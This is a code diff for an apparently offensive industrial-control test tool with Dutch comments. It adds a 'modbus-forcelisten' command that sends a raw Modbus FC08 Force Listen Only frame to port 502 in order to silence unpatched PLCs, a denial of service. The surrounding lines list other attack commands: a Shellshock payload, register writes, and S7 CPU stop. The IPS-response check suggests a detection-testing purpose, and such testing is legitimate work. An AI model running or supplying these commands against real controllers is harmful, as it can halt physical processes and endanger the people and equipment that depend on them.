@@ -9,6 +9,7 @@ Elk commando print als laatste regel één JSON-object: {"ok": bool, "detail": .
   shellshock <url>                  HTTP GET met een Shellshock-payload (CVE-2014-6271)
   modbus-read <ip> <addr> <count>   holding registers lezen
   modbus-write <ip> <addr> <value>  holding register schrijven
+  modbus-forcelisten <ip>           Force Listen Only Mode (FC08): PLC stilzetten (DoS)
   s7-read <ip>                      CPU-status + DB1 lezen
   s7-stop <ip> / s7-start <ip>      CPU naar STOP / RUN
   opcua-browse <url>                OPC UA-objecten opvragen
@@ -106,6 +107,30 @@ def cmd_modbus_write(ip, addr, value):
         c.close()
 
 
+def cmd_modbus_forcelisten(ip):
+    """Modbus Force Listen Only Mode (FC08, sub-functie 0x0004): zet een
+    ongepatchte PLC stil. Conform spec stuurt de PLC hier geen antwoord op; een
+    IPS die het pakket herkent dropt of reset de sessie."""
+    frame = bytes.fromhex("000100000006010800040000")
+    try:
+        s = socket.create_connection((ip, 502), timeout=5)
+    except OSError as e:
+        out(False, f"{ip}:502 niet bereikbaar - {e}")
+    try:
+        s.sendall(frame)
+        s.settimeout(3)
+        try:
+            data = s.recv(64)
+        except socket.timeout:
+            out(True, f"force-listen afgeleverd bij {ip}:502 (geen antwoord, conform spec)")
+        out(True, f"force-listen afgeleverd bij {ip}:502"
+                  + (f" (onverwacht antwoord {data.hex()})" if data else " (sessie gesloten)"))
+    except (ConnectionResetError, BrokenPipeError, OSError) as e:
+        out(False, f"{ip}:502 - sessie gedropt/gereset (IPS?): {e}")
+    finally:
+        s.close()
+
+
 def _s7(ip):
     import snap7
     c = snap7.client.Client()
@@ -161,6 +186,7 @@ def cmd_opcua_browse(url):
 COMMANDS = {
     "scan": cmd_scan, "tcp": cmd_tcp, "http": cmd_http, "shellshock": cmd_shellshock,
     "modbus-read": cmd_modbus_read, "modbus-write": cmd_modbus_write,
+    "modbus-forcelisten": cmd_modbus_forcelisten,
     "s7-read": cmd_s7_read, "s7-stop": cmd_s7_stop, "s7-start": cmd_s7_start,
     "opcua-browse": cmd_opcua_browse,
 }
